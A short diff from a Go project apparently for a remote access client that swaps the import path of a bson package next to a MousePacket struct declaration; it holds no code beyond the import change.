@@ -4,7 +4,7 @@ import (
 	"rat/client/network/header"
 	"rat/client/screen"
 
-	"github.com/pkg/bson"
+	"gopkg.in/mgo.v2/bson"
 )
 
 type MousePacket struct {
